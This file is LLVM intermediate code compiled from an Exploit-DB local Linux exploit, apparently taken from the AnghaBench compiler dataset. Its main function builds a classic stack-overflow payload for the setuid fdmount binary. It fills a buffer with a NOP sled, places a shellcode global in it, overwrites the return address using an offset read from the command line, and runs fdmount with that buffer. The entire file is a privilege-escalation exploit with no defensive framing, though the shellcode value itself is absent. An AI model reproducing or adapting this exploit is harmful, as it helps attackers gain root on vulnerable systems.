; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19954.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19954.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFSIZE = common dso_local global i32 0, align 4
@shell = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"/usr/bin/fdmount\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"fdmount\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"fd0\00", align 1
@eip = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFFSIZE, align 4
  %13 = add nsw i32 %12, 6
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %8, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %9, align 8
  %17 = ptrtoint i64* %10 to i64
  store i64 %17, i64* %10, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp sgt i32 %18, 1
  br i1 %19, label %20, label %27

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i64 @atoi(i8* %23)
  %25 = load i64, i64* %10, align 8
  %26 = add i64 %25, %24
  store i64 %26, i64* %10, align 8
  br label %27

27:                                               ; preds = %20, %2
  %28 = call i32 @memset(i8* %16, i32 144, i32 75)
  %29 = load i32, i32* @BUFFSIZE, align 4
  %30 = load i32, i32* @shell, align 4
  %31 = call i32 @strlen(i32 %30)
  %32 = sub nsw i32 %29, %31
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %16, i64 %33
  %35 = load i32, i32* @shell, align 4
  %36 = load i32, i32* @shell, align 4
  %37 = call i32 @strlen(i32 %36)
  %38 = call i32 @memcpy(i8* %34, i32 %35, i32 %37)
  %39 = getelementptr inbounds i8, i8* %16, i64 71
  %40 = bitcast i8* %39 to i64*
  store i64* %40, i64** %11, align 8
  %41 = load i64, i64* %10, align 8
  %42 = load i64*, i64** %11, align 8
  store i64 %41, i64* %42, align 8
  %43 = getelementptr inbounds i8, i8* %16, i64 75
  store i8 0, i8* %43, align 1
  %44 = getelementptr inbounds i8, i8* %16, i64 0
  store i8 47, i8* %44, align 16
  %45 = call i32 @execl(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i8* %16, i32* null)
  %46 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %46)
  %47 = load i32, i32* %3, align 4
  ret i32 %47
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
